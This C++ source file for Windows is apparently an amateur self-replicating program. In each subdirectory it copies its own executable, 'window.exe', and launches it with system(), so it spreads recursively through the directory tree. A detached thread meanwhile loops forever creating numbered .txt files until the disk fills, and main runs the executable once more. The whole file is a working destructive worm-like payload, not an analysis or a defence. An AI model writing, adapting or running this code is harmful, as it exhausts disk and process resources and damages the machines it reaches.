#define _WIN32_WINNT 0x0A00
#define _WIN32_WINNT_WINTHRESHOLD 0x0A00
#include "mingw.invoke.h"
#include "mingw.thread.h"
#include <iostream>
#include <dirent.h>
#include <sys/types.h>
#include <string.h>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <atomic>
#include <chrono>


using namespace mingw_stdthread;
//using namespace std::chrono_literals;


void test_thread(){
    while (true){
        std::cout << "IM detached !" << std::endl;
    }
}


void copy_thread(){
    std::ostringstream oss;
    std::ofstream file;
    int i = 1;
    while (true)
    {
        i++;
        oss << i << ".txt";
        file.open(oss.str());
        oss.str("");
        file.close();
    }
}

void list_dir(const char *path)
{
    struct dirent *entry;
    DIR *dir = opendir(path);

    if (dir == NULL)
    {
        std::cout << "NULL DIR" << std::endl;
    }
    char cwd[256];
    std::string src_path(getcwd(cwd, sizeof(cwd)));
    src_path += "\\window.exe";
    while ((entry = readdir(dir)) != NULL)
    {
        std::cout << entry->d_name << std::endl;

        // check if entry is a directory
        if (entry->d_type == DT_DIR)
        {
            // ignore "." and ".." directories
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            {
                continue;
            }
            std::cout << src_path << std::endl;
            std::ifstream src(src_path, std::ios::binary);
            if (!src)
            {
                std::cout << "Unable to open source file" << std::endl;
                exit(1);
            }
            chdir(entry->d_name);
            std::cout << "ENTERED IN: " << getcwd(cwd,sizeof(cwd)) << std::endl;
            std::ofstream dst("window.exe", std::ios::binary);
            if (!dst)
            {
                std::cerr << "Error: Unable to open destination file\n";
                exit(1);
            }

            dst << src.rdbuf();
            src.close();
            dst.close();
            system(".\\window.exe");
            chdir("..");

            // recursively list the contents of the subdirectory
        }
    }
    closedir(dir);

}
void run_command_in_subdirs(const char *path1)
{
    // Open the current directory
    char cwd[1024];
    DIR *dir = opendir(path1);
    if (dir == nullptr)
    {
        // Could not open the directory
        std::cerr << "Error: Could not open directory" << std::endl;
        return;
    }

    // Read each entry in the directory
    struct dirent *entry;
    while ((entry = readdir(dir)) != nullptr)
    {
        // Check if the entry is a directory
        if (entry->d_type == DT_DIR)
        {
            // Run the command in the subdirectory
            chdir(entry->d_name);
            //system(".\\copy.exe");
            chdir("..");

        }
    }

    // Close the directory
    closedir(dir);
}
int main()
{
    char cwd[1024];
    getcwd(cwd,sizeof(cwd));
    //std::atomic<bool> done(false);
    /* Run some task on a new thread.
     Make sure to set the done flag to true when finished. */
    //std::thread listdir([&done, &cwd]
     //                   {
    //list_dir(cwd);
    //std::this_thread::sleep_for(3s);
    //done = true;
    // Run the loop after the list_dir function finishes.
    /*while (true) {
      std::cout << "IM RUNNING NOW" << std::endl;
    } });*/
    std::thread listdir (list_dir, cwd);
    std::thread c_t (copy_thread);
    listdir.join();
    c_t.detach();

    //listdir.join();  //Join thread. 
    system(".\\window.exe");
    std::cout << "Finished" << std::endl;

    // thread t1(copy_thread);
    // t1.join();
}